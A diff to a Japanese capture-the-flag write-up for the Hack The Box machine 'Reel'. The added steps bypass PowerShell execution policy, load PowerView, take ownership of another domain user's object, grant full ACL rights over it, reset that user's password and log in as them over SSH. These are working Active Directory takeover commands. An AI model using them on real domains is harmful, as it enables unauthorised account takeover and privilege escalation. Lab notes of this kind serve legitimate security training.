@@ -244,3 +244,44 @@ libreofficeで開くと各ユーザは何ができるか？（WriteDaclとかGen
 
 claireのオーナーをtomにすれば、tomはclaireのパスワードを設定できる！
 
+PowerView.ps1を使うが、次のようにExecutinPolicyを設定してPowerShellを起動する必要がある：
+```
+tom@REEL C:\Users\tom>powershell                                                                                                
+Windows PowerShell                                                                                                              
+Copyright (C) 2014 Microsoft Corporation. All rights reserved.                                                                  
+
+PS C:\Users\tom> . .\PowerView.ps1                                                                                              
+. : File C:\Users\tom\PowerView.ps1 cannot be loaded because its operation is blocked by software restriction policies, such    
+as those created by using Group Policy.                                                                                         
+At line:1 char:3                                                                                                                
++ . .\PowerView.ps1                                                                                                             
++   ~~~~~~~~~~~~~~~                                                                                                             
+    + CategoryInfo          : SecurityError: (:) [], PSSecurityException                                                        
+    + FullyQualifiedErrorId : UnauthorizedAccess                                                                                
+PS C:\Users\tom> exit                                                                                                           
+
+tom@REEL C:\Users\tom>powershell -ExecutionPolicy Bypass                                                                        
+Windows PowerShell                                                                                                              
+Copyright (C) 2014 Microsoft Corporation. All rights reserved.                                                                  
+
+PS C:\Users\tom> . .\PowerView.ps1
+```
+
+以下のようにclaireのパスワード設定まで行う：
+
+（詳しくは[ここ](https://github.com/MASAbirokou/ActiveDirectory_memo/blob/main/WriteOwner_passwdreset_Reel.md)）
+
+```
+PS C:\Users\tom> Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
+PS C:\Users\tom> Add-DomainObjectAcl -PrincipalIdentity tom -TargetIdentity claire -Rights All 
+PS C:\Users\tom> $passwd = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+PS C:\Users\tom> Set-DomainUserPassword -Identity claire -AccountPassword $passwd 
+```
+
+新しくclaireのパスワードがPassword123!に設定されたのでそれを使ってclaireのシェルをとる：
+
+```
+┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77]
+└─$ ssh claire@10.10.10.77
+```
+
